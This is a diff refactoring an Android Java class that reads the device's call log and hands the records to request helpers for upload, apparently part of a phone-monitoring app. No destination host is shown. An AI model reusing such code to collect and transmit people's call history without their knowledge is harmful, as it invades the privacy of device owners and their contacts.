@@ -10,10 +10,10 @@ import android.os.AsyncTask;
 import android.preference.PreferenceManager;
 import android.provider.CallLog;
 
-import com.inet.android.db.RequestDataBaseHelper;
-import com.inet.android.request.OnDemandRequest;
+import com.inet.android.request.RequestList;
 import com.inet.android.utils.ConvertDate;
 import com.inet.android.utils.Logging;
+
 /**
  * ListCall class is designed to get the list of call
  * 
@@ -21,22 +21,16 @@ import com.inet.android.utils.Logging;
  * 
  */
 public class ListCall extends AsyncTask<Context, Void, Void> {
-	TurnSendList sendList;
-	ConvertDate date;
-	RequestDataBaseHelper db;
 	Context mContext;
 	private String iType = "1";;
-	private String LOG_TAG = "ListCall";
-	// private int type;
+	private String LOG_TAG = ListCall.class.getSimpleName().toString();
 	private String complete;
 	private String version;
-	SharedPreferences sp;
-
+	
 	private String readCallLogs() {
 		String sendStr = null;
 		String type = "0";
-		date = new ConvertDate();
-		sp = PreferenceManager.getDefaultSharedPreferences(mContext);
+		SharedPreferences sp = PreferenceManager.getDefaultSharedPreferences(mContext);
 		version = sp.getString("list_call", "0");
 		Logging.doLog(LOG_TAG, "readCall", "readCall");
 
@@ -80,7 +74,7 @@ public class ListCall extends AsyncTask<Context, Void, Void> {
 							.getColumnIndex(CallLog.Calls.DURATION);
 					String duration = callLogCursor.getString(durationInt);
 
-					String dateString = date.getData(dateTimeMillis);
+					String dateString = ConvertDate.getData(dateTimeMillis);
 
 					if (cacheNumber == null)
 						cacheNumber = number;
@@ -140,8 +134,7 @@ public class ListCall extends AsyncTask<Context, Void, Void> {
 	}
 
 	private void endList() {
-		sendList = new TurnSendList(mContext);
-		sendList.setList(iType, version, "0");
+		TurnSendList.setList(iType, version, "0", mContext);
 	}
 
 	private void lastRaw(String sendStr) {
@@ -151,11 +144,7 @@ public class ListCall extends AsyncTask<Context, Void, Void> {
 	}
 
 	private void sendRequest(String str, String complete) {
-		if (str != null) {
-			OnDemandRequest dr = new OnDemandRequest(mContext, iType, complete,
-					version);
-			dr.sendRequest(str);
-		}
+		RequestList.sendDemandRequest(str, iType, complete, version, mContext);
 	}
 
 	@Override
